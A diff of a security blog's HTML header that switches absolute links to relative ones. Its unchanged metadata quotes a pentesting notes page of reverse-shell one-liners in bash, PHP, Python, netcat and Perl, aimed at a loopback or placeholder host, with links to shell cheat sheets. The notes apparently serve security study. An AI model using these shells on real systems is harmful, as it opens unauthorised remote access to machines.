@@ -8,7 +8,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <meta name="author" content="meowmeowattack" />
     <meta name="description" content="" />
-    <link rel="stylesheet" href="https://meowmeowattack.github.io/css/main.min.fe9a01128f24537e52223a846795c30968baf4cbb17d0f03a14ea859993459ca.css" />
+    <link rel="stylesheet" href="/css/main.min.fe9a01128f24537e52223a846795c30968baf4cbb17d0f03a14ea859993459ca.css" />
 
     
     <meta name="twitter:card" content="summary"/>
@@ -18,7 +18,7 @@
     <meta property="og:title" content="Notes - Shell" />
 <meta property="og:description" content="Cheat sheets https://oscp.infosecsanyam.in/shells/reverse-shell-cheat-sheet https://github.com/the-emmon/lsp-reverse-shell Common shells # bash &gt; bash -i &gt;&amp; /dev/tcp/127.0.0.1/4444 0&gt;&amp;1 # php &gt; php -r &#39;$sock=fsockopen(&#34;127.0.0.1&#34;,4444);exec(&#34;/bin/sh -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3&#34;);&#39; # python &gt; python -c &#39;import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((&#34;127.0.0.1&#34;,4444));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call([&#34;/bin/sh&#34;,&#34;-i&#34;]);&#39; # nc1 &gt; nc -e /bin/sh 127.0.0.1 4444 # nc2 &gt; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 127.0.0.1 4444 &gt;/tmp/f # perl &gt; perl -e &#39;use Socket;$i=&#34;127.0.0.1&#34;;$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname(&#34;tcp&#34;));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,&#34;&gt;&amp;S&#34;);open(STDOUT,&#34;&gt;&amp;S&#34;);open(STDERR,&#34;&gt;&amp;S&#34;);exec(&#34;/bin/sh -i&#34;);};&#39; ## perl Windows &gt; perl -MIO -e &#39;$c=new IO::Socket::INET(PeerAddr,&#34;ip:4444&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;;&#39; use IO::Socket; use IO::Socket::INET; $p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,&#34;ip:443&#34;);STDIN-&gt;fdopen($c,r);$~-&gt;fdopen($c,w);system$_ while&lt;&gt;; # ruby * https://github." />
 <meta property="og:type" content="article" />
-<meta property="og:url" content="https://meowmeowattack.github.io/notes/4-shell/" /><meta property="article:section" content="notes" />
+<meta property="og:url" content="/notes/4-shell/" /><meta property="article:section" content="notes" />
 <meta property="article:published_time" content="2022-07-07T23:18:05+13:00" />
 <meta property="article:modified_time" content="2022-07-07T23:18:05+13:00" />
 
@@ -27,7 +27,7 @@
   </head>
   <body>
     <header class="app-header">
-      <a href="https://meowmeowattack.github.io/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
+      <a href="/"><img class="app-header-avatar" src="/avatar.jpg" alt="meowmeowattack" /></a>
       <span class="app-header-title">meowmeowattack</span>
       <nav class="app-header-menu">
           <a class="app-header-menu-item" href="/">/meow</a>
